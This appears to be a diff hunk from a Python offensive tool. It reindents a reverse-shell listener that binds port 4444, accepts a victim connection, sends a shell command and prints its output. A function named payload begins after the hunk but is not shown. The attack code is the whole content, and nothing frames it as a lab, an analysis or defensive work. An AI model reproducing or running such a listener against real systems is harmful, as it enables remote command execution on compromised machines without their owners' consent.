@@ -52,18 +52,18 @@ def reverse_shell_listener():
 	s = socket.socket(AF_INET, SOCK_STREAM) # Create our socket handler.
 	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) # Set is so that when we cancel out we can reuse port.
 	try:
-	    s.bind(('', 4444)) # Bind to interface.
-	    print("[*] Listening on 0.0.0.0:4444") # Print we are accepting connections.
-	    s.listen(10) # Listen for only 10 unaccepted connections.
-	    conn, addr = s.accept() # Accept connections.
-	    print("[+] Connected by", addr) # Print connected by ipaddress.
-	    data = conn.recv(1024).decode("UTF-8") # Receive initial connection.
-        conn.send(bytes(shellcode, "UTF-8")) # Send shell command.
-        data = conn.recv(1024).decode("UTF-8") # Receive output from command.
-        print(data) # Print the output of the command.
+		s.bind(('', 4444)) # Bind to interface.
+		print("[*] Listening on 0.0.0.0:4444") # Print we are accepting connections.
+		s.listen(10) # Listen for only 10 unaccepted connections.
+		conn, addr = s.accept() # Accept connections.
+		print("[+] Connected by", addr) # Print connected by ipaddress.
+		data = conn.recv(1024).decode("UTF-8") # Receive initial connection.
+		conn.send(bytes(shellcode, "UTF-8")) # Send shell command.
+		data = conn.recv(1024).decode("UTF-8") # Receive output from command.
+		print(data) # Print the output of the command.
 	except KeyboardInterrupt: 
-	    print("...listener terminated using [ctrl+c], Shutting down!")
-	    exit() # Using [ctrl+c] will terminate the listener.
+		print("...listener terminated using [ctrl+c], Shutting down!")
+		exit() # Using [ctrl+c] will terminate the listener.
 
 
 def payload():
